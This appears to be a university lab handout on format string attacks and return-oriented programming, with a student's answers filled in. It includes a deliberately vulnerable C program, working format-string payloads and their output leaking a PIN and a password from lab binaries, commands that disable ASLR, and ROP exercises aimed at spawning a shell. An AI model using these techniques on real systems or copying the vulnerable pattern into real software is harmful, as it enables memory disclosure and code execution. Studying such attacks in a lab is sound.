printf("The printf can store the number of bytes written to stdout up to
this point%n (this number is stored in n1) and the ones up to this
point%n (this number is stored in n2)\n", &n1, &n2);
}
```
```
Figure 1: A simpleprintfexample (/lab04material/fs/prinftexample.c).
```
This section will explain you how to perform format string attacks then, you will be asked to solve two simple
exercises.

### The printf function

Let’s start this set of exercises with a simple example presented in Figure 1.

You are certainly familiar with theprintffunctions, but let’s repeat some basic concepts as the perspective of
software programmer and attacker are different.

Normal printing.Starting from this instruction, argument how the format strings (\%d) are associated to the
variables.

```
printf("%d %d %d", a,b,c);
```
It is important to understand: What actually are the symbolsa,b,c? Where are they stored? How are the
symbolsa,b,cused in order to retrieve the values that are actually printed?

```
→ They are 3 addresses of local variables, stored on the stack. Before the function call, the program will access those addresses and place their integer content inside the space for the parameters (32 bit: stack, 64 bit:RDI (identifiers string), RSI(first parameter), RDX, R10, R8 and R9). The printf will access those parameters as if they were integers and display the result.
```
More variables. Now, discuss what happens when there are more variables than format strings, like in the
instruction below:

```
printf("%d %d", a,b,c);
```
```
→ the c variable is not displayed
```
More format strings.On the contrary, what happens if there are more format strings than variables from which
to take the values?
```
printf("%d %d %d", a,b);
```
```
→ the printf looks for the third argument (32 bit: on the stack, 64 bit: in RDI, RSI, RDX, R10, R8 and R9), take whatever is present in that place and tries to read it as if it was an integer.
```
```c
include <stdio.h>

int main(void) {
char buffer[128];

printf("Insert a string: ");
gets(buffer, sizeof(buffer), stdin);
printf(buffer);

return 0;
}
```
```
Figure 2: Typical weakness that allow format string attacks (lab04material/fs/memoryread.c).
```
What is the values printed on the screen? Discuss your opinion on where theprintfhas taken the last printed
value.

```
→ For normal strings, the string is printed on the screen. For strings containing identifiers, it tries to read from the parameters
```
Direct access to variables.Moreover, theprintfallows us to directly access the passed arguments:

```
printf("%2$d %3$d %1$d", a,b,c);
```
Can you comment on what is the code above performing?

```
→ Tries to access the second, third, first parameter, even if they are not present, just looking in the expected position
```
Can you figure out the mechanism theprintfuses to number and refer to the parameters it accesses?

```
→ 1,2,3 number of the parameter.
```
Write printed characters.Finally, theprintfcan also save data in memory, as in the following instruction:

```
printf("The printf can store the number of bytes written to stdout up to this
point%n (this number is stored in n1) and the ones up to this point%n (this
number is stored in n2)\n", &n1, &n2);
```
The purpose of the\%n printffeature was introduced to manage well-formatted and aligned ASCII-based
GUIs.

```
NOTE
It is important to remember that&n1is the address where to write the counter of the printed characters.
```
### Reading the memory

Let us consider the program presented in Figure 2. In this case, you can control what to pass to theprintf
function. What is the most useful payload you can pass?

```
→ One containing % signs to read/write memory, eventually obtaining a shell
```

Take advantage of the Python scripting to pass a format string that allow you to print the content of the stack.

```
→
```
Try now with a marker, like with the following in the command line below:

```
python -c ’print("AAAA"+".%x"*10)’ | ./fs
N.B. python -c 'print("AAAA"+"\n%x"*101)' | ./memory_read
only prints:
Insert a string: AAAA

```
to determine where the"AAAA"is in the stack (i.e. how many 4-bytes blocks from the beginning of what has
been printed out by theprintffunction).

```
→ python -c 'print("AAAA"+".%4$x")' | ./memory_read 
Insert a string: AAAA.41414141

```
Use the direct access to the parameters to only print the marker twice.

Can you imagine how to use the approach with markers just presented to read arbitrary values in memory?
What should you use instead of the"AAAA"to read the content of a specific address?

```
→ "\xc4\xce\xff\xff.%4$s" address and %s to follow the indirection
```
Try now to apply the concepts seen here for solving the following exercises.

### Exercise 1

#### ATTENTION

```
Before starting these exercise, you should disable the ASLR, otherwise all the segments will be
allocated in random memory positions. This is possible by running this command:
echo 0 | sudo tee /proc/sys/kernel/randomizevaspace
The ASLR will be disable until the next restart.
Should you need to enable it again before the restart you can run
echo 2 | sudo tee /proc/sys/kernel/randomizevaspace
```
```
Purpose: apply a formt string attack to read the content of a local variable.
Suggested tool: pwntools, shell + python.
Hints: Find the address of the memory location to read then use the ex-
amples seen before to read the content (the marker example).
```
Find a ways to print the value of the PIN variable by exploiting the format strings.

The binary file is available in the lab04 material file:

/lab04material/fs/fs

The source code is also available in the material file:

/lab04material/fs/fs1.c


#### NOTE

```
You can get the address of variables in the stack usinggdb. Add a breakpoint (e.g. to the main function),
then disassmble the main and add another breakpoint just before the execution of the format string
injection. You can inspect the whole stack with
x/nx$esp
wherenis the number of bytes in the stack that you want to be printed.
In any case, the application you have to tamper with, prints out the address of the important variables.
Therefore, just look at the output. You will also notice that the addresses are different when you execute
the application normally or when you debug it.
```

```
python -c 'print("EEEE"+".%x"*100)' | ./fs1
Insert a string: ffffcf90buf=0xffffcf90, pin=0xffffcf10
EEEE.ffffcf90.ffffcf10.565561c3.41414141.42414141.43414141.44414141.5a414141.f7dcbc00.f7dc1a6c.565552de.f7dcb35c.f63d4e2e.ffffcf60.7b1ea71.ffffcff4.f7fc33f0.f7fe6740.ffffcfb0.ffffcfb8.1000.8000.ffffcfb0.0.0.800.8.40.f7ffdb98.ffffcff4.f63d4e2e.565552de.f7fd6bd4.5655526c.ffffcffc.[[[45454545]]].2e78252e.252e7825.78252e78.2e78252e.252e7825

python -c 'print("EEEE"+".%36$x")' | ./fs1
Insert a string: ffffcf90buf=0xffffcf90, pin=0xffffcf10
EEEE.45454545

python -c 'print("\xff\xff\xcf\x10"+".%36$s")' | hexdump -C

00000000  ff ff cf 10 2e 25 33 36  24 73 0a                 |.....%36$s.|
0000000b

python -c 'print("\x10\xcf\xff\xff"+".%36$s")' | hexdump -C
00000000  10 cf ff ff 2e 25 33 36  24 73 0a                 |.....%36$s.|
0000000b

python -c 'print("\x10\xcf\xff\xff"+".%36$s")' | ./fs1     
Insert a string: ffffcf90buf=0xffffcf90, pin=0xffffcf10
���.AAAAAAABAAACAAADAAAZ
```

### Exercise 2

```
Purpose: apply a format string attack to read the content of a global vari-
able.
Suggested tool: pwntools, shell + python.
Hints: Find the address of the memory location to read then use the ex-
amples seen before to read the content (the marker example).
```
Find a way to print the content of the password, saved as a global, which has been declared as a variable.

The binary file is available in the lab04 material file:

/lab04material/fs/fs

The source code is also available in the material file:

/lab04material/fs/fs2.c

```
NOTE
You can get the address of a variable the string by means ofgdb. Add a breakpoint (e.g. to the main
function), then use (assuming the symbols have not been stripped down):
x/x &variablename
to print the address of the variable, in this case the pointer to beginning of the string. This is possible if
ASLR is not enabled, as in this case. Otherwise, userabin2to check first.
```

```
gdb
info variables

File fsx.c:
3:	const char password[23];

pwndbg> x/x &password
0x56557008 <password>:	0x73696854

\x54\x68\x69\x73
python -c 'print("\x54\x68\x69\x73"+".%4$x")' | ./fs2
Insert a string: This.73696854

\x08\x70\x55\x56
python -c 'print("\x08\x70\x55\x56"+".%4$s")' | ./fs2
Insert a string:pUV.This1sm1Str0ngPassw0rd

```

## 4 Additional challenges available in the web

This repository contains several crack-me challenges (akarev), nonetheless, the distinction between challenges
that only require reversing and the ones that require tampering (pwnchallenges) is not always thatevident

```
https://crackmes.one/search
```
Root me also contains a section dedicated to crack-me challenges, they range from basic to medium-level ones.

```
https://www.root-me.org/en/Challenges/Cracking/
```
WeChalls is another website that contains interesting challenges in increasing order of difficulty:

```
https://w3challs.com/challenges/list/reversing
https://w3challs.com/challenges/list/pwn
```
This site, which also has additional “wargames”, proposes Narnia to learn basic exploitation:

```
https://overthewire.org/wargames/narnia/
```
This tutorial also shows how to use format string attacks to overwrite the GOT and tamper with applications:

```
https://axcheron.github.io/exploit-101-format-strings/
```
If you want to find more advanced (pwn) challenges (and very well done tutorials)

```
https://pwnable.kr/
```
This website introduces to ROP attacks:

```
https://ropemporium.com/
```
Concerning the format string attacks, you can learn how to write values in memory with the\%nreading these
tutorials:

```
https://secgroup.dais.unive.it/teaching/security-course/format-strings/
http://marcin.owsiany.pl/sec/format-string-attacks.pdf
```

## A little more advanced attacks

## 5 Return Oriented Programming

This section will show you some examples of Return Oriented Programming. This technique becomes
necessary when the NX (no-execute) flag is set, thus a simple Buffer Overflow would not work. You
will have to perform static and dynamic analysis to solve the following three exercises.
These attacks are much more complex than the previous ones. It is not expected that you are able to
solve them during the lab. During the next days we will publish hints on how to solve them, if you didn’t
succeed yet by yourself.

### Exercise 1

```
Purpose: modify the program control flow in order to make the program
print the content offlag.txt.
Suggested tools: pwntools, shell + python, gdb, Ghidra.
Hints: The program already implements a function that executes “cat
flag.txt”
Source: ROP Emporium
```
As a first exercise, you have to use ROP in a version usually called ret2win, since the program will return
to a “win function”. The binary file is available in the lab03 material file:
/lab03material/rop/rop
As for the buffer overflow exercises, it is suggested to build the exploit in (at least) three different
methods:

- directly on the shell, build the payload with a Python in-line command, then use a pipe to pass it
    to the target program
- usinggdb, you should already know the payload. Put a breakpoint in the main, then disassemble
    thepwnmefunction and add another breakpoint before the instruction where the input is collected.
    Then, use thegdbvisualization options to inspect the stack before and after the input is collected.
    x/192x $esp
- with thepwntools, use the processprocessto execute an application, build the payload by
    concatenating the strings you want to pass, then use thesendlinecommand to pass your payload
    to the process.

Hints:

- first force the application to crash and determine how many bytes you need to send to overwrite
    the return address (you may want to investigate how useful is the pwntools functioncyclic);
- find the address of the ret2win function (any static analysis tool will work fine);
- you may have to add some address of a RET in the payload (seehttps://ropemporium.com/
    guide.html, “Common Pitfalls”, “The MOVAPS issue”).

```
ATTENTION
Some versions of GLIBC use themovapsinstructions to move data onto the stack in certain
functions. The 64 bit calling convention requires the stack to be 16-byte aligned before a
callinstruction but this is easily violated during ROP execution. Make sure to align the
stack to 16 bytes before calling e.g. asystem().
```

```
See solutions
```

### Exercise 2


```
Purpose: modify the program control flow in order to make the program
print the content offlag.txt.
Suggested tool: pwntools, shell + python, gdb, Ghidra.
Hints: Find a way to modify the parameter of an already present
system().
Source: ROP Emporium
https://ropemporium.com/challenge/split.html
```
This challenge requires more steps than the previous one and it is for sure more challenging. You have
to build a so called ROP chain. The binary file is available in the lab03 material file:
/lab03material/rop/rop

```
gdb info functions
0x0000000000400560  system@plt

```

### Exercise 3

```
Purpose: spawn a shell exploiting ROP.
Suggested tool: pwntools, shell + python, gdb.
Hints: use, again, asystemfunction
Source: 0x00sec.org
```
This time there is no useful function, implemented by the user, to jump to. But there is plenty of
functions inside thelibc.

Try to craft your ROP chain in two ways:

- put the argument of thesysteminside the buffer and use its address to point at what you wrote
- search (e.g. with gdb) for the right argument inside the binary

The binary file is available in the lab03 material file:
/lab03material/rop/rop
The source code is also available in the material file:
/lab03material/rop/rop3.c

### Exercise 4

```
Purpose: spawn a shell exploiting ROP.
Suggested tool: pwntools, shell + python, gdb.
Hints: exploit a logic flaw to pass the canary check
Author: AC (pwnthem0le)
```
This exercise is very similar to the Exercise 5. The difference is in the stack canary, which is now
enabled; this makes overwriting the return address almost impossible.
Be aware that this is the most difficult exercise of this section.
The binary file is available in the lab03 material file:
/lab03material/rop/rop


